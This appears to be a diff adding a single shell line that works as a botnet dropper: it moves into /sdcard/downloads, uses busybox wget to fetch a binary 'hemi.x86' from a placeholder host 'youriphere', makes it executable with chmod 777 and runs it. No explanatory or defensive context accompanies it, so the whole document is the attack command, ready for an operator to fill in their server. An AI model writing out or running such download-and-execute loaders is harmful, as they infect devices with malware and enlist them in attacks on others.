@@ -1,0 +1,3 @@
+cd /sdcard/downloads; busybox wget http://youriphere/bins/hemi.x86; chmod 777 hemi.x86; ./hemi.x86 root->>.x86
+
+
